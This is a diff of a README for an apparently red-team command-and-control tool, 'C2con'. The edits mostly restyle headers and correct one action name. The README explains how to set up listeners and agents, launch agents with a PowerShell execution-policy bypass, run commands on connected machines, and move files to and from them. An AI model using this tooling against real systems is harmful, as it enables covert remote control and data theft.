@@ -7,7 +7,7 @@ systemctl daemon-reload
 service apache2 restart
 
 
---[Installation]--
+--[Install and Run C2]--
 
 git clone https://github.com/Ug0Security/C2con/
 cd C2con/
@@ -17,7 +17,7 @@ bash C2.sh
 
 
 
---[create listener]--
+--[Create Listener]--
 
 action = create
 what = listener
@@ -29,7 +29,7 @@ Listener Port =  what you want (need to fit the agent)
 
 The listener is launched upon creation
 
---[create agent]--
+--[Create Agent]--
 
 action = create
 what = agent
@@ -43,14 +43,14 @@ Listener Port =  what you want (need to fit the listener)
 
 the created agent is stored in /tmp/$filename.
 
---[Run agent]--
+--[Run Agent]--
 
 bash /tmp/hehe.sh 123 http://127.0.0.1:8888
 python /tmp/hehe.py 123 http://127.0.0.1:8888
 go run /tmp/hehe.go 123 http://127.0.0.1:8888
 powershell -noexit -nologo -executionpolicy bypass -File .\hehe.ps1 123 http://127.0.0.1:8888
 
---[Run commands on connected agent]--
+--[Run Commands On Connected Agent]--
 
 action = run
 agent  = agentID
@@ -58,20 +58,23 @@ Ze juice = $Cmd_To_Run
 
 Wait up to 10 second to get the output
 
---[Upload file to agent]--
+--[Upload File To Agent]--
+
 action = upload
 agent  = agentID
 URL = Url with file to upload
 Path = Path to store the file (need to be writable by the agent)
 
 
---[download file from agent]--
+--[Download File From Agent]--
+
 action = download
 agent  = agentID
 Ze File = File to download (need to be readable by the agent)
 
---[Clear output files]--
-action = create
+--[Clear Output Files]--
+
+action = clear
 files = res or cmds
 
 //to do//
